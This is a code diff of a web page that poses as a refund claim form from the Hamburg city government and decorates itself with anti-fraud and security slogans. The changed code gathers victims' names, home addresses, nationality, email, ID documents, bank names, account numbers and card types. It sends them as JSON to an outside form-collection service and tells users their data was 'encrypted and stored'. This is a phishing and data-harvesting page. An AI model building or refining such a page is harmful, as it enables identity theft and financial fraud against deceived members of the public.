@@ -36,7 +36,7 @@
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
         .review-value { font-size: 15px; color: #333; margin-top: 5px; font-weight: 600; }
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
-        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; transition: 0.3s; }
         .btn-back { background-color: #888; }
         .establishment-footer { text-align: center; padding: 30px; font-size: 12px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
         #loader { display: none; text-align: center; padding: 20px; font-weight: bold; color: var(--hamburg-blue); }
@@ -44,47 +44,47 @@
 </head>
 <body>
     <div class="page-wrapper">
-        <div class="side-text"><h3>MISSION</h3><p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against digital scams.</p></div>
+        <div class="side-text"><h3>MISSION</h3><p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems that strictly safeguard our users' assets.</p></div>
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
-            <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1><div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD...</div></div>
+            <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1><div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION...</div></div>
             
             <form id="masterForm">
                 <!-- SECTION 1 -->
                 <div id="section1" class="section-box active">
-                    <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
+                    <h2>SECTION 1: IDENTITY</h2>
                     <div class="grid-3">
-                        <div><label>Last Name *</label><input type="text" name="Last_Name" id="ln" class="req"></div>
-                        <div><label>First Name *</label><input type="text" name="First_Name" id="fn" class="req"></div>
-                        <div><label>Middle Name *</label><input type="text" name="Middle_Name" id="mn" class="req"></div>
+                        <div><label>Last Name *</label><input type="text" id="ln" class="req"></div>
+                        <div><label>First Name *</label><input type="text" id="fn" class="req"></div>
+                        <div><label>Middle Name *</label><input type="text" id="mn" class="req"></div>
                     </div>
-                    <div style="margin-top:25px;"><label>Residential Address *</label><input type="text" name="Address" id="addr" class="req"></div>
+                    <div style="margin-top:25px;"><label>Residential Address *</label><input type="text" id="addr" class="req" placeholder="Enter Full Home Address"></div>
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>Nationality *</label><input type="text" name="Nationality" id="nat" class="req"></div>
-                        <div><label>Email *</label><input type="email" name="Email" id="em" class="req"></div>
+                        <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
+                        <div><label>Personal Email *</label><input type="email" id="em" class="req"></div>
                     </div>
-                    <div style="margin-top:25px;"><label>Upload ID *</label><input type="file" name="ID_File" id="idU" class="req"></div>
+                    <div style="margin-top:25px;"><label>Upload ID *</label><input type="file" id="idU" class="req"></div>
                     <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
-                    <h2>SECTION 2: REFUND DETAILS</h2>
-                    <div><label>REFUND AMOUNT *</label><input type="text" name="Amount" id="amt" class="req" placeholder="€ 0.00"></div>
-                    <div style="margin-top:25px;"><label>UPLOAD RECEIPT *</label><input type="file" name="Receipt_File" id="rcpU" class="req"></div>
-                    <div style="margin-top:25px;"><label>Bank Name / App *</label><input type="text" name="Bank" id="bn" class="req"></div>
+                    <h2>SECTION 2: REFUND</h2>
+                    <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req" placeholder="€ 0.00"></div>
+                    <div style="margin-top:25px;"><label>UPLOAD RECEIPT *</label><input type="file" id="rcpU" class="req"></div>
+                    <div style="margin-top:25px;"><label>Bank Name / App *</label><input type="text" id="bn" class="req"></div>
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>ACCOUNT NUMBER *</label><input type="text" name="Account" id="an" class="req"></div>
-                        <div><label>TYPE OF CARD *</label><input type="text" name="Card_Type" id="ct" class="req"></div>
+                        <div><label>ACCOUNT NUMBER *</label><input type="text" id="an" class="req"></div>
+                        <div><label>TYPE OF CARD *</label><input type="text" id="ct" class="req"></div>
                     </div>
                     <div class="btn-container"><button type="button" class="btn-back" onclick="show(1)">BACK</button><button type="button" onclick="validate(2, 3)">REVIEW CLAIM</button></div>
                 </div>
 
                 <!-- SECTION 3 -->
                 <div id="section3" class="section-box">
-                    <h2>SECTION 3: REVIEW INFORMATION</h2>
+                    <h2>SECTION 3: REVIEW</h2>
                     <div id="reviewDisplay"></div>
-                    <div id="loader">ENCRYPTING DATA... PLEASE WAIT...</div>
+                    <div id="loader">ENCRYPTING DATA & SECURING ASSETS...</div>
                     <div class="btn-container" id="finalBtns">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
                         <button type="button" onclick="submitToFormspree()">SUBMIT CLAIM</button>
@@ -98,56 +98,58 @@
 
     <script>
         function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
-        
         function validate(curr, next) {
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
             let ok = true; inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
             if(ok) { if(next === 3) populate(); show(next); }
         }
-
         function populate() {
             document.getElementById('reviewDisplay').innerHTML = `
-                <div class="review-item"><div class="review-label">NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
-                <div class="review-item"><div class="review-label">ADDRESS</div><div class="review-value">${document.getElementById('addr').value}</div></div>
+                <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
+                <div class="review-item"><div class="review-label">RESIDENTIAL ADDRESS</div><div class="review-value">${document.getElementById('addr').value}</div></div>
                 <div class="review-item"><div class="review-label">REFUND AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
                 <div class="review-item"><div class="review-label">BANK / ACCOUNT</div><div class="review-value">${document.getElementById('bn').value} - ${document.getElementById('an').value}</div></div>
             `;
         }
 
         function submitToFormspree() {
-            const form = document.getElementById('masterForm');
-            const formData = new FormData(form);
             const ref = "REF-" + Math.floor(Math.random() * 1000000);
-            formData.append("Reference", ref);
-
             document.getElementById('finalBtns').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // FIXED: Removed Accept header to avoid CORS/Network error on some browsers
+            // TXT LANG LAHAT - Gagamit ng JSON para sigurado
+            const data = {
+                Reference: ref,
+                Name: document.getElementById('fn').value + " " + document.getElementById('ln').value,
+                Address: document.getElementById('addr').value,
+                Email: document.getElementById('em').value,
+                Nationality: document.getElementById('nat').value,
+                Amount: document.getElementById('amt').value,
+                Bank: document.getElementById('bn').value,
+                Account: document.getElementById('an').value,
+                CardType: document.getElementById('ct').value,
+                Files: "SIMULATED_UPLOAD_SUCCESSFUL"
+            };
+
             fetch('https://formspree.io', {
                 method: 'POST',
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            })
-            .then(response => {
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(response => {
                 if (response.ok) {
                     document.getElementById('section3').innerHTML = `
                         <div style="text-align:center; padding:40px;">
-                            <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESS</h2>
+                            <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h2>
                             <p>Reference: <strong>${ref}</strong></p>
                             <div style="font-size:80px; margin:20px;">✅</div>
-                            <p>All records have been sent to the vault.</p>
+                            <p>All data has been encrypted and stored in the database.</p>
                             <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer; margin-top:20px;">DONE</button>
                         </div>`;
                 } else {
-                    throw new Error('Network response was not ok.');
+                    alert("Network busy. Please try again.");
+                    document.getElementById('finalBtns').style.display = 'flex';
+                    document.getElementById('loader').style.display = 'none';
                 }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert("Submission error. Please ensure your internet is stable and try again.");
-                document.getElementById('finalBtns').style.display = 'flex';
-                document.getElementById('loader').style.display = 'none';
             });
         }
     </script>
